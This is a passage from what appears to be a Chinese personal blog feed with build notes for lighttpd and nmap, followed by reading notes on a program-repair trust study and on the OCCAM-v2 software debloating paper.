https://git.lighttpd.net/lighttpd/lighttpd1.4.gitcd lighttpd1.4# subsequent updates (to obtain latest source)#cd lighttpd1.4git pull</code></pre><ol start="2"><li>更新依赖 <code>apt-get build-dep lighttpd</code></li><li>automake</li></ol><pre><code class="language-bash">#cd lighttpd1.4./autogen.shCC=clang ./configure -C --prefix=/usr/local  # ./configure --help for additional optionsmake -j 4make check</code></pre><ol start="4"><li>出现问题</li></ol><pre><code class="language-bash">configure: error: pcre2-config not found, install the pcre2-devel package or build with --without-pcre2</code></pre><p>解决方法：<code>apt install libpcre2-dev</code></p><ol start="5"><li>编译完成后，在<code>src</code>目录下生成<code>lighttpd</code>可执行文件</li><li>结合<code>razor</code>运行</li></ol><h3 id="nmap" tabindex="-1">nmap</h3><ol><li><a href="https://nmap.org/dist/">下载位置</a></li><li><a href="https://nmap.org/book/inst-source.html">按照指导编译</a></li><li>使用clang编译</li></ol><pre><code class="language-bash">CC=clang CXX=clang++ ./configuremake</code></pre><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/katex/dist/katex.min.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/markdown-it-texmath/css/texmath.min.css">]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SoftwareEngineering </tag>
            
            <tag> SoftwareDebloating </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>用户研究论文阅读</title>
      <link href="/2024/01/22/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/%E7%94%A8%E6%88%B7%E7%A0%94%E7%A9%B6%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/"/>
      <url>/2024/01/22/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/%E7%94%A8%E6%88%B7%E7%A0%94%E7%A9%B6%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/</url>
      
        <content type="html"><![CDATA[<h2 id="1.-trust-enhancement-issues-in-program-repair" tabindex="-1">1. Trust Enhancement Issues in Program Repair</h2><p>2022 IEEE/ACM 44th International Conference on Software Engineering (ICSE)</p><h3 id="00-%E6%91%98%E8%A6%81" tabindex="-1">00 摘要</h3><ul><li>自动化程序修复既是是一项新兴技术,通过学习、搜索和语义分析来自动修复程序中的错误和漏洞。</li><li>然而为了该技术更广泛的使用,对自动生成的补丁的信任是必要的,为此本文对100多位开发人员进行类调查,以了解他们对自动化程序修复的信任问题。</li><li>根据开发者偏好的调查反馈，我们对现有的基于测试套件的程序修复工具进行了定量评估。我们发现它们无法在一个小时的可接受时间范围内生成排名前10的高质量补丁。</li><li>我们的定性研究中开发者的反馈以及对现有修复工具的定量考察观察结果指出了推动程序修复研究的可行见解。具体而言，我们注意到在可接受的时间限制内生成修复补丁很大程度上取决于利用足够丰富的搜索空间的抽象表示</li><li>此外，尽管开发者的额外输入对于生成或排名补丁很有价值，但他们似乎对于大规模的人机交互并不感兴趣。</li></ul><h3 id="01-%E4%BB%8B%E7%BB%8D" tabindex="-1">01 介绍</h3><ul><li><p>令人惊讶的,无论学术界还是工业界,有关开发者对自动化程序修复信任的研究几乎没有(软件去膨胀也是一样)</p></li><li><p>我们希望研究开发者 不愿意使用程序修复的原因 是不是在于 不想依赖于自动生成的代码;这会有深远的影响,因为最近LLM的出现为自动生成代码完成工作带来了希望</p></li><li><p>本文中研究了如何增强开发者对自动生成的补丁的信任的问题,首先确定了与开发者对自动生成的补丁的信任相关的研究问题,分为两个类别</p><ul><li>a. 开发者对自动修复技术的期望,为此研究一下问题<ul><li>RQ1:开发者对应用自动化程序修复（以下简称APR）的兴趣程度有多大，以及他们如何设想使用它？</li><li>RQ2:软件开发人员可以提供额外的输入来增加对生成的补丁的信任度吗？</li><li>RQ3:自动程序修复（Automated Program Repair，APR）产生的补丁能增加开发者的信任的证据有哪些？</li></ul></li><li>b. 现有程序修复技术在满足开发者期望方面可能存在的不足,<ul><li>RQ4:现有自动修复技术能否在可接受的时间范围内(0.5/1/2 小时)确定高质量补丁的位置</li><li>RQ5:在APR的效率上,额外的输入(例如修复位置和额外的测试案例)会带来什么影响</li></ul></li></ul></li><li><p>对于a,我们在100多名专业软件开发人员中进行调查（共有35个问题）,多数为开发人员,少数为高级人员如架构师.结果显示</p><ul><li>开发人员对使用APR生成的少量(不超过10个)补丁持开放态度,但这些补丁要在可接受的时间范围内生成</li><li>此外开发人员愿意接受程序修复方法的标准(可以证明程序修复的正确性),同时也愿意提供额外的输入来推动APR的发展</li><li>开发人员最接受的额外输入是额外的测试用例</li></ul></li><li><p>对于b</p><ul><li>在我们的实验中会严格要求时间不超过1小时</li><li>同时对著名的修复工具进行比较和定量分析,得出结论:搜索空间的表示在在可接受的时间范围内产生合理/正确的补丁中很重要</li><li>最后,我们注意到APR可以视为微观层面的自动代码生成,通过研究APR的信任问题,我们也可以初步了解如何增强自动生成代码的信任</li></ul></li></ul><h3 id="02-%E7%A8%8B%E5%BA%8F%E4%BF%AE%E5%A4%8D%E4%B8%AD%E7%9A%84%E8%A7%84%E8%8C%83" tabindex="-1">02 程序修复中的规范</h3><ul><li><p>本段回顾这些规范讨论他们如何影响补丁的质量</p></li><li><p>测试套件即规范 Test Suites as Specification.</p><ul><li>修复目标:通过测试组件中所有测试用例来修复程序</li><li>问题:带来过拟合,因为测试套件可能不完整</li></ul></li><li><p>约束即规范 Constraints as Specification</p><ul><li>修复目标:修补程序使满足给定的约束</li><li>问题:实际中不能总是可以得到约束条件;同时满足约束后的程序不一定和源程序功能相同</li></ul></li><li><p>代码样式即规范 Code Patterns as Specification</p><ul><li>问题:不能满足功能的正确性</li></ul></li></ul><h3 id="03-%E8%B0%83%E6%9F%A5%E6%96%B9%E6%B3%95" tabindex="-1">03 调查方法</h3><ul><li><p>不可靠的过拟合补丁会导致开发人员对APR工具失去信任。这促使我们询问/调查开发人员如何增强APR以获得他们的信任。我们设计并进行了一项针对软件从业者的调查，旨在回答前三个研究问题（RQ1-3）。</p></li><li><p>调查询问35个问题,分为6类,问题包括 开放性和封闭性问题的组合,采用多项选择或5点李克特量表,问卷使用Microsoft Forms创建和部署</p><ul><li>C1 APR的使用情况（RQ1）：开发人员是否会使用APR，以及如何使用。</li><li>C2 输入/规范的可用性（RQ2）：开发人员可以为APR技术提供哪些类型的输入工件。</li><li>C3 对信任的影响（RQ2）：额外的输入将如何影响对自动生成的补丁的信任。</li><li>C4 解释（RQ3）：开发人员期望自动生成的补丁提供哪些证据/解释。</li><li>C5 APR副产品的使用情况（RQ3）：APR的哪些副产品对开发人员有用，例如用于手动修复错误。</li><li>C6 背景：参与者在软件开发过程中的角色和经验。</li></ul></li><li><p>通过两个渠道发放调查问卷 (1) Amazon Mturk,(2)向全球公司联系人放松私人链接. 随后对回复进行过滤,最终得到了103个有效的回复</p></li><li><p>分析措施:略</p></li></ul><h3 id="04-%E8%B0%83%E6%9F%A5%E7%BB%93%E6%9E%84" tabindex="-1">04 调查结构</h3><h4 id="4.1-developer-engagement-with-apr-(rq1)-%E5%BC%80%E5%8F%91%E8%80%85%E5%9C%A8apr%E7%9A%84%E5%8F%82%E4%B8%8E" tabindex="-1">4.1 Developer engagement with APR (RQ1) 开发者在APR的参与</h4><ul><li><p>本部分研究C1类</p></li><li><p>APR的接受度:</p><ul><li>额外的用户提供的文档，如测试用例，有助于增加对自动生成的补丁的信任。</li><li>但完全的开发者信任需要进行开发者手动的补丁审查,自动化动态和静态分析的测试报告，以及对补丁的解释，可以促进审查工作的进行。</li></ul></li><li><p>APR的交互</p><ul><li>开发者期望与APR的交互量较少，例如仅提供初始文档，测试用例。</li><li>APR应该能够在较短的时间内（30分钟至60分钟内）生成少量（5到10个）的补丁</li><li>APR应该要集成到现有的DevOps流程中，以支持开发工作流程。</li></ul></li></ul><h4 id="4.2-availability%2Fimpact-of-artifacts-(rq2)-%E6%96%87%E6%A1%A3%E7%9A%84%E5%8F%AF%E7%94%A8%E6%80%A7%2F%E5%BD%B1%E5%93%8D" tabindex="-1">4.2 Availability/Impact of Artifacts (RQ2) 文档的可用性/影响</h4><ul><li>本部分研究C2,C3类,调查开发者可以提供哪些额外的文档,以及这些文档对APR信任的影响:额外的测试用例,程序断言,逻辑约束</li><li>此外,参与者希望和工具交互较少,但如果工具提出了一些问题,开发者愿意提供额外的输入</li><li>大多数参与者认为出</li></ul><h4 id="4.3-%E8%A1%A5%E4%B8%81-%E7%9A%84%E8%A7%A3%E9%87%8A%2F%E8%AF%81%E6%8D%AE" tabindex="-1">4.3 补丁 的解释/证据</h4><h3 id="05-%E8%AF%84%E4%BC%B0%E6%96%B9%E6%B3%95" tabindex="-1">05 评估方法</h3><h3 id="06.-%E8%AF%84%E4%BC%B0%E7%BB%93%E6%9E%9C" tabindex="-1">06. 评估结果</h3><h4 id="6.1-apr-within-realistic-boundaries-apr-%E5%9C%A8%E7%8E%B0%E5%AE%9E%E8%8C%83%E5%9B%B4%E5%86%85(rq4)" tabindex="-1">6.1 APR within realistic boundaries APR 在现实范围内(RQ4)</h4><h4 id="6.2-impact-of-additional-inputs-%E9%A2%9D%E5%A4%96%E8%BE%93%E5%85%A5%E7%9A%84%E5%BD%B1%E5%93%8D(rq5)" tabindex="-1">6.2 Impact of additional inputs 额外输入的影响(RQ5)</h4><h3 id="07-threats-to-validity-%E5%AF%B9%E6%9C%89%E6%95%88%E6%80%A7%E7%9A%84%E5%A8%81%E8%83%81" tabindex="-1">07 THREATS TO VALIDITY 对有效性的威胁</h3><h3 id="08-%E7%9B%B8%E5%85%B3%E5%B7%A5%E4%BD%9C" tabindex="-1">08 相关工作</h3><h3 id="09-%E8%AE%A8%E8%AE%BA" tabindex="-1">09 讨论</h3><ul><li><p>在本文中，我们研究了提高开发人员对自动生成的补丁的信任度所涉及的问题。</p><ul><li>通过与100多名实践者的详细研究，我们探讨了开发人员对自动化程序修复工具的期望和容忍程度。</li><li>然后，我们对现有的修复工具进行定量评估，以模拟新手APR用户的经验。我们的定性和定量研究表明，需要探索的方向包括：减少与修复工具的交互、交换生成的测试用例等作为输入和修复工具输出的工件，以及关注抽象搜索空间表示而不是搜索算法框架。每个修复工具都有许多参数，我们只使用了默认参数设置，就像新手用户所期望的那样——我们没有探索各种参数设置。为了了解修复工具的全部功能，未来有必要系统地探索大量的参数设置，并尝试使用不同的超时时间来运行这些工具。</li></ul></li><li><p>自动化代码生成越来越火,但我们是否可以信任这种自动生成的代码,这将是一个吸引人的研究</p></li></ul><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/katex/dist/katex.min.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/markdown-it-texmath/css/texmath.min.css">]]></content>
      
      
      <categories>
          
          <category> 论文 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SoftwareRepair </tag>
            
            <tag> user_study </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Software Debloating 论文阅读 （11）</title>
      <link href="/2024/01/22/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/SoftwareDebloating/Software%20Debloating%20%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB(11)/"/>
      <url>/2024/01/22/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/SoftwareDebloating/Software%20Debloating%20%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB(11)/</url>
      
        <content type="html"><![CDATA[<h2 id="occam-v2%EF%BC%9A" tabindex="-1">OCCAM-v2：</h2><p>Navas J A, Gehani A. OCCAM-v2: Combining Static and Dynamic Analysis for Effective and Efficient Whole-program Specialization: Leveraging scalable pointer analysis, value analysis, and dynamic analysis[J]. Queue, 2022, 20(5): 58-85.</p><h3 id="0-%E6%91%98%E8%A6%81" tabindex="-1">0 摘要</h3><ul><li>软件已发展到可以支持多样的功能集。灵活的软件工程实践，如为重用行设计而引入的冗余代码。在更常见的模式中，整个库被链接，然而实际上只需要其中的少数功能。这些额外代码的积累可能会对只需要访问功能子集的应用程序产生负面影响。</li><li>嵌入式系统通常只有有限的内存，不必要的代码占用的空间回增加成本并对性能产生不利影响。云计算平台可能会因为臃肿的代码增加内部攻击面，通过 return-oriented programming，jump-oriented programming，和call-oriented programming等机制</li><li>随着配置参数的增加，程序的轨迹空间呈指数增长。这使得全面测试成本的增加，这次进了全程序特化的需求，这可以将程序分析集中在将要部署的特定版本上</li><li>由于LLVM中间代码可以编译多种源语言，目前已经有一些工具来特化LLVM bit码，包括OCCAM[13]，LLPE[20]，Trimmer[19]. 然而，它们只能使用编译器转换来完成任务，相比之下，我们的工具OCCAM-v2，结合了更深入的静态分析，实用抽象解释框架，以及鼎泰分析。这种组合提供了更好的结果。</li><li>OCCAM-v2是我们之前工具OCCAM的扩展。将自动化构建复杂bit码的功能分解为一个单独的工具gllvm[8]。本文首先提供关于OCCAM的相关背景，然后描述其静态分析扩展，这些扩展提供了与OCCAM相同的健全性保证。接下来，将解释了使用了动态分析的可选的激进特化，最后报告了在一组应用程序上评估该工具的结果。</li></ul><h3 id="1-%E8%83%8C%E6%99%AF" tabindex="-1">1 背景</h3><ul><li>OCCAM-v1 使用部分估值法来简化大的应用和他们的依赖，如下图示（虚线框内的组件是 OCCAM-v2 中新增的。）</li><li>具体而言，OCCAM 允许将静态信息通过一个包含特定环境细节的专用清单传递给目标程序的入口。该工具工作在LLVM bit码上，这是一个中间表示，可以从多种源语言编译。</li></ul><p><img src="/images/%E8%AE%BA%E6%96%87/software%20debloating%20%E8%AE%BA%E6%96%87/(11)_1.png" alt></p><ul><li>每个模块的函数和调用点被计算并保存在外部接口定义中，利用这个信息，OCCAM接着搜索具有具体参数的跨模块调用，如果找到这样一个调用，将根据策略确定是否需要特化该函数。 当这种情况发生时，会构建新函数的代码并将其添加到相关的LLVM位代码模块中，相应的接口将被更新以反映新函数的特征；具有相同签名的其他调用点将使用特化版本</li><li>OCCAM从程序入口出发，并使用应用程序清单所提供的任何静态信息。然后对包含在main中的调用点所识别的函数模块进行特化，该过程一直持续到找到所有可达模块。在每个步骤中，调用LLVM的内部优化。特别是，使用全局优化器进行进行常量折叠和传播，去除死代码，修建未使用的分支和不可达代码，这也是OCCAM的模块内特化。</li><li>由于这个过程可能会发现新的特化机会，所以整个过程将持续到能够达到全局稳态。通过这种方式，OCCAM能够完成整个程序的特化，在最后一步，OCCAM调用LLVM的编译器将位码转换为本机对象，并调用链接器生成特化的本机应用。</li></ul><h3 id="2-%E6%89%A9%E5%B1%95%E7%9A%84%E7%9A%84%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90" tabindex="-1">2 扩展的的静态分析</h3><ul><li>OCCAM-v2 的静态分析改进源于它引入了自定义指针分析和值分析。这两者都基于抽象解释。</li><li>LLVM 的 PoolAlloc DSA（数据结构分析）可以被OCCVM-v2使用来解析间接函数调用以及其他指针。</li><li>OCCAM-v2 使用了改进的 DSA 变种计算的调用图：开源的类型敏感指针分析工具 SeaDSA。</li></ul><h4 id="2.1-%E6%9B%B4%E7%B2%BE%E7%A1%AE%E7%9A%84%E8%B0%83%E7%94%A8%E5%9B%BE%E6%9E%84%E9%80%A0" tabindex="-1">2.1 更精确的调用图构造</h4><h5 id="%E8%B7%A8%E6%A8%A1%E5%9D%97%E6%8E%A5%E5%8F%A3%E7%9A%84%E6%94%B9%E8%BF%9B" tabindex="-1">跨模块接口的改进</h5><ul><li>为了支持对大型软件的应用，OCCAM一次只对一个模块进行操作。<ul><li>然而为了促进整个程序的分析，对一个模块的更改必须意识到该模块与其它代码的交互。</li><li>通过对每个模块构建一个接口来实现这一点，该接口在更新其它模块的过程中使用。</li><li>特别地，接口提供了在模块内使用的外部符号和调用的描述。</li></ul></li><li>OCCAM-v1中，接口生成使用了LLVM计算的调用图，OCCAM-v2 使用了由 SeaDSA 计算的调用图。这个调用图比LLVM的更精确。<ul><li>这反过来提高了模块接口的特异性，从而优化了跨模块的特化</li><li>当一个模块的接口被计算出，它刚开始包括所有的非内部链接调用点（因此可以跨模块调用）。</li><li>此外，到达函数的来自其它模块调用的调用点也会被识别出来</li><li>这些调用是在间接的情况下，目标可以是任何函数，使用已经解析的调用图，OCCAM-v2减少了可能的集合</li></ul></li></ul><h5 id="%E5%A4%84%E7%90%86%E5%87%BD%E6%95%B0%E6%8C%87%E9%92%88%E5%8F%82%E6%95%B0" tabindex="-1">处理函数指针参数</h5><ul><li>当对一个在模块外的函数进行调用时，其签名会出现在包含调用方的模块的接口中</li><li>当调用点包含一个常量参数时，可以对调用进行特化；如果参数是一个函数指针，OCCAM 仅限于使用 null 值的情况，这无法处理将函数作为参数按引用传递的情况</li><li>OCCAM-v2 支持对具有函数指针参数的外部调用进行特化。如果在调用方的上下文中函数接受一个或多个常量参数，那么该函数现在也可以被专门化。这是特别值得注意的，因为它涵盖了常见的编程模式，如回调函数的使用。</li></ul><h5 id="%E5%9F%BA%E4%BA%8E%E7%AD%BE%E5%90%8D%E7%9A%84%E5%80%99%E9%80%89%E8%B0%83%E7%94%A8%E6%B6%88%E9%99%A4" tabindex="-1">基于签名的候选调用消除</h5><ul><li>使用DSA会导致对实际程序的调用图的过度估计，因为DSA忽略了函数调用参数的类型，因此，具有与调用点签名不匹配的函数可能被错误地认为是有效候选函数</li><li>为解决这个问题，通过SeaDSA地的指针分析，将间接调用替换为一个switch语句，其中每个case对应一个候选地址，此后生成的调用图将不含间接调用<ul><li>在某些情况下，调用点和候选函数地址的签名可能不匹配，该分析可以根据参数类型正确地过滤出这种情况</li></ul></li></ul><h5 id="%E5%9F%BA%E4%BA%8E%E7%B1%BB%E5%B1%82%E6%AC%A1%E5%88%86%E6%9E%90%E7%9A%84%E5%80%99%E9%80%89%E8%B0%83%E7%94%A8%E6%B6%88%E9%99%A4" tabindex="-1">基于类层次分析的候选调用消除</h5><ul><li>当间接调用解析为一组候选地址时，生成的调用图与原程序的调用图相比不够精确，通过减少候选集可以提高之后静态分析的精度。如果LLVM比特码的实例源于用C++编写的程序，则可以使用CHG（class hierarchy graph 类层次图）来提高分析的精度</li><li>OCCAM-v2构建了一个CHG，其节点是一个C<ins>类，两类之间的边表示父子类。CHG用于解析C</ins>虚拟函数的间接调用（指针分析支持C++虚拟调用，但是CHG通常可以通过分析从LLVM比特码中提取的虚拟表的信息来细化SeaDSA的推断）</li><li>对于来自C++程序的虚拟调用的调用点，执行以下步骤<ul><li><ol><li>确定包含调用方法的对象所关联的类C</li></ol></li><li><ol start="2"><li>计算所有直接或间接派生的C类的子类（CHG可用时该步骤可很快得到）</li></ol></li><li><ol start="3"><li>使用每个子类的虚拟表，手机所有具有与步骤1中提到的被调用方法匹配的类型签名的方法（通过检查比特码构造类的虚拟表）</li></ol></li></ul></li><li>此时，对于一个间接调用，所有来自虚拟调用的可能的调用被找到，这将允许使用该调用集合的间接调用被解析。</li></ul><h5 id="%E5%9F%BA%E4%BA%8E%E5%88%AB%E5%90%8D%E5%88%86%E6%9E%90%E7%9A%84%E4%BC%98%E5%8C%96" tabindex="-1">基于别名分析的优化</h5><ul><li>LLVM框架提供了AliasAnalysis基础结构。<ul><li>该客户端的API可以查询两个LLVM值是否为别名，这对于在优化目标代码时，两个值不能指向相同位置的变换非常有用。 实现必须对内存建模并支持回答这些查询</li></ul></li><li>SeaDSA实现了AliasAnalysis的API，这使得OCCAM-v2可以使用整个LLVM passes套件来增加指向信息的精度。</li><li>改进的别名分析也促进了其它优化，如死存储消除，可以帮助静态变量的识别</li></ul><h4 id="2.2-%E6%9D%83%E5%80%BC%E5%88%86%E6%9E%90%E7%9A%84%E4%BD%BF%E7%94%A8" tabindex="-1">2.2 权值分析的使用</h4><ul><li>OCCAM在简化软件时使用死代码消除，简化算法的核心依赖于构建从变量到常量的映射，这意味着该变量在所有可能的程序执行中都具有可以识别的常量值。<ul><li>为了创建更多的特化机会，OCCAM-v2构建了从变量到区间的映射，这将使得分支推理依赖于变量的值的范围</li></ul></li><li>抽象解释Abstract interpretation 是一种程序进行形式推理的常用技术，是静态分析设计的数学基础。<ul><li>该技术的一个经典用途是推断每个程序变量可以取地可能的值。这些可能的值使用不同的方式进行近似（称为抽象域）：区间最大最小值；两个变量间的差异；八角形约束；变量间地线性不等式</li></ul></li><li>尽管该分析很强大，但在LLVM中不可用。<ul><li>原因之一是大多数实现只考虑整数，而LLVM中的整数为机器算术。将这种分析调整为可以在机器算术中的工作是具有挑战性的，因为很难在精度和效率之间找到良好的平衡</li></ul></li></ul><h5 id="%E6%8E%A8%E6%96%AD%E4%B8%8D%E5%8F%98%E9%87%8F" tabindex="-1">推断不变量</h5><ul><li>C++库Crab7支持使用抽象解释对程序进行静态分析<ul><li>Crab在目标程序的CFG（控制流图）上进行操作，该形式语言无关</li><li>Clam4前端将LLVM IR转换为Crab的表示形式，随后使用Crab来推断目标程序中的不变量，通常接着进行常量传播和死代码消除（使用LLVM passes优化）。 已识别出的不变量可以让passes作出更强的假设，达到更好的优化</li></ul></li></ul><h5 id="%E5%AD%97%E6%AE%B5%E6%95%8F%E6%84%9F%E7%9A%84%E5%B8%B8%E9%87%8F%E4%BC%A0%E6%92%AD" tabindex="-1">字段敏感的常量传播</h5><ul><li>OCCAM的模块内特化依赖于LLVM的SCCP (sparse conditional constant propagation)。<ul><li>这个pass在分析时受到限制，因为其设计是 为了效率，在编译器的工作流程中使用</li><li>特别是，如果常量存储在C数组或结构体字段中,SCCP无法识别这个静态数据</li></ul></li><li>Clam 依赖于SeaDSA的字段敏感推理来维护内存的抽象表示。<ul><li>SeaDAS将内存划分为有限的区域，每个区域映射到一个逻辑数组，此时，区域由一个逻辑表达式建模，该表达式描述了受内存访问操作影响的位置。这使得能够有效地推理关于由SeaDSA处理的内存的情况，其中包括别名分析。</li></ul></li><li>当LLVM位码转化为crab的CFG时，内存存储被建模位弱更新（知道受影响区域但确切位置不知道）。clam为若更新定义了一个抽象与，crab在CFG推理时使用。<ul><li>虽然在域中推理是高效的，但不够精准，为了提高精准度，特别在结果体字段的情况下，开发了一种新的抽象域。其提供了混合抽象，这里在特殊情况下，内存被建模为强更新（将旧值替换为新值）</li></ul></li></ul><h5 id="%E5%87%BD%E6%95%B0%E5%86%85%E9%83%A8%E5%88%86%E6%9E%90%E7%9A%84%E4%BC%98%E5%8C%96" tabindex="-1">函数内部分析的优化</h5><ul><li>对不变量的了解有助于编译器优化，提高了OCCAM-v2的特化和消除目标应用程序及其依赖中代码片段的能力。</li><li>为此，我们开发了一种上下文敏感的构成分析，提供了比基础型更高的精准度。</li><li>为了提高性能，增加对函数内部分析备忘录。 尽管可能导致内存的额外消耗，但可以通过限制备忘录大小随后同构循环利用解决</li></ul><h3 id="3-%E9%9B%86%E6%88%90%E7%9A%84%E5%8A%A8%E6%80%81%E5%88%86%E6%9E%90" tabindex="-1">3 集成的动态分析</h3><ul><li>作为在线部分求值器，OCCAM依赖于具体的已知的代码简化。<ul><li>这些信息的一个重要来源是用户指定的参数集，在实践中，这些参数由类似于getopt()的功能在程序入口附近处理。</li><li>这样的代码通常在循环中处理复杂字符串操作，此外，循环的界限可能不是静态的，这对静态分析技术构成了挑战</li></ul></li><li>OCCAM-v2的DCA（deployment context analysis）将特化分为两个阶段<ul><li>从概念上讲，目前程序的执行跟踪为第一阶段的前缀，使用动态分析计算，同时在第一阶段后缀也有，用于代表第一阶段未执行的程序</li><li>动态分析从程序入口开始，只要仍处在关键的混合状态，动态分析就要继续。具体来说，任何分支选择必须取决于已知的值</li><li>内存快照是前缀执行结束时的程序状态。它用于使用静态分析简化后缀。</li></ul></li><li>这个功能是通过修改LLVM的解释器lli来实现的。这个新的passes与lli有三个不同之处：<ul><li><ol><li>当遇到虚拟寄存器或在栈或堆上分配的内存位置的值，在执行期间可能是未知的。例如，程序可能使用第一个参数的值（在C中称为argv[1]），但在运行时用户可能在调用程序时没有提供任何参数。在这种情况LLVM解释器将中止执行。相反，新的pass将移动到下一个位代码指令并继续解释。</li></ol></li><li><ol start="2"><li>当遇到值未知的寄存器或内存位置时，新的传递将跟踪此事实。当后续指令依赖于未知值时，其结果也将被跟踪为未知。通过这种方式，新功能提供了一种轻量级的绑定时间分析，将动态值的污点向前传播。</li></ol></li><li><ol start="3"><li>在解释的位代码指令是依赖于未知值的条件时，执行将被停止。这使得程序可以在分支存在的情况下继续运行，只要可以评估它们。停止执行的条件是为了避免探索潜在的指数级状态空间，如果必须跟踪依赖于未知值的分支，将会导致这种情况发生。</li></ol></li></ul></li></ul><h4 id="%E9%80%89%E9%A1%B9%E5%A4%84%E7%90%86" tabindex="-1">选项处理</h4><h4 id="%E5%A4%9A%E6%A8%A1%E5%9D%97%E5%8A%A8%E6%80%81%E5%88%86%E6%9E%90" tabindex="-1">多模块动态分析</h4><h4 id="%E4%BF%9D%E5%AE%88%E6%8E%92%E9%99%A4" tabindex="-1">保守排除</h4><h4 id="%E5%8F%98%E9%87%8F%E5%87%BD%E6%95%B0" tabindex="-1">变量函数</h4><h4 id="%E5%A4%84%E7%90%86%E7%AE%97%E6%9C%AF%E5%86%85%E5%9C%A8%E5%87%BD%E6%95%B0" tabindex="-1">处理算术内在函数</h4><h4 id="%E6%9A%B4%E9%9C%B2%E5%B0%81%E8%A3%85%E7%9A%84-libc-%E8%B0%83%E7%94%A8" tabindex="-1">暴露封装的 libc 调用</h4><h3 id="4-%E8%AF%84%E4%BC%B0" tabindex="-1">4 评估</h3><ul><li>使用20个应用软件，是Trimmer中使用的，在Trimmer中有解释原因</li><li>Ubuntu 18.04 ，LLVM 10</li></ul><h4 id="effectiveness-%E6%95%88%E6%9E%9C" tabindex="-1">Effectiveness 效果</h4><ul><li>程序被编译成LLVM位码，随后位码中指令的数量。</li><li>分别计算 仅使用静态分析的OCCAM-v2，使用静态分析和动态分析的OCCAM-v2 删除指令的百分比<ul><li>每种情况下，特化上下文于Trimmer评估中的上下文相同。</li></ul></li><li>从数据中可以看出，OCCAM-v2动态分析和静态分析结合总是比单独使用静态分析可以删除更多的指令，平均而言，OCCAM-v2的混合分析可以删除原程序40.6%的LLVM IR指令<br><img src="/images/%E8%AE%BA%E6%96%87/software%20debloating%20%E8%AE%BA%E6%96%87/(11)_2.png" alt></li></ul><h4 id="efficiency-%E6%95%88%E7%8E%87" tabindex="-1">Efficiency 效率</h4><ul><li>OCCAM-v2的静态分析被设计为 支持大规模且高效，必要时可以牺牲精度来换取效率。具体来说<ul><li>所使用的指针分析基于Bjarne Steensgard的算法</li><li>抽象解释框架配置为仅使用计算上高效的推理域，包括布尔值、区间和步幅</li><li>因此当使用静态分析模式时，平均特化时间为6.7s</li></ul></li><li>与Trimmer进行对比，其使用基于Lars Andersen的算法的指针分析（在SVF框架中实现）来选择精度而非可伸缩性。这一效果可以在配置注释通行证的成本中看到。<ul><li>对于Trimmer分析时间最长的三个程序，它们分别是objdump、yices和gprof，其分别使用了41.4、23.6和16.3分钟。</li><li>相比之下，OCCAM-v2对这三个程序进行的整个基于静态分析的专门化分别在34、34和27秒内完成。</li></ul></li><li>下图展示了每个程序的特化时间，其中包括静态分析和混合分析的时间。注意时间刻度为指数增长<ul><li>对于大多数程序，两种方法时间相似，bzip2例外，因为特化被配置为利用目标文件的内容，需要解释器遍历整个运行，尽管有此异常值，混合分析特化平均时间为22.4s<br><img src="/images/%E8%AE%BA%E6%96%87/software%20debloating%20%E8%AE%BA%E6%96%87/(11)_3.png" alt></li></ul></li></ul><h3 id="5-%E9%99%90%E5%88%B6%E5%92%8C%E7%BC%93%E8%A7%A3%E6%8E%AA%E6%96%BD" tabindex="-1">5 限制和缓解措施</h3><h4 id="%E6%95%B4%E4%B8%AA%E7%A8%8B%E5%BA%8F%E5%81%87%E8%AE%BE" tabindex="-1">整个程序假设</h4><ul><li>OCCAM假设在特化时可以访问“整个程序”——即目标应用程序及其所有依赖的所有代码。这使得其能够把整个程序中调用的任何代码都可以作为待删除项，这种方法对许多程序有效，但并非对所有程序都适用。</li><li>存在多种原因导致这种担忧。<ul><li>一个重要的情况是，一个对象的源代码必须链接到程序中，但只能以汇编的形式提供。在这种情况下，OCCAM的分析将不会意识到在这样的对象中对外部全局变量的任何函数调用或访问，因为汇编不能构建成LLVM位代码。因此，OCCAM可能会删除所需的符号和函数。我们在musl libc和Linux内核中都遇到过这种情况。</li><li>在没有汇编的情况下，也可能发生类似的情况——例如，Apache根据其配置文件动态加载模块。这些模块可能会引入反向依赖性，即主程序包含特定函数的假设，这些函数可能已经基于对它们的调用缺失而被删除。为了解决这些情况，我们在OCCAM-v2中添加了对指定一组不应被内部化的函数和全局变量的支持。这样可以防止死代码消除删除这些元素</li></ul></li></ul><h4 id="%E9%93%BE%E6%8E%A5%E6%97%B6%E7%AC%A6%E5%8F%B7%E5%86%B2%E7%AA%81%E6%8E%AA%E6%96%BD" tabindex="-1">链接时符号冲突措施</h4><ul><li>OCCAM在模块内迭代执行常量传播和死代码消除，以及跨模块的函数特化。当达到一个固定点时，特化的模块被链接在一起。在这个阶段，模块中的符号可能会发生冲突。</li><li>符号冲突可能发生在应用程序中使用了相同的符号，以及它的一个库中使用了相同的符号，或者在多个库中定义了相同的符号。特化函数的命名方案最大程度地减少了新冲突可能性。OCCAM-v2通过一个中间步骤解决了这个问题。链接在内部进行分阶段，允许在参数中指定的位代码文件中的符号覆盖后续的重复符号。使用llvm-link构建中间链接的位代码文件，然后使用clang++将其与在清单中指定的本机库链接。</li></ul><h3 id="6-%E6%9C%AA%E6%9D%A5%E6%96%B9%E5%90%91" tabindex="-1">6 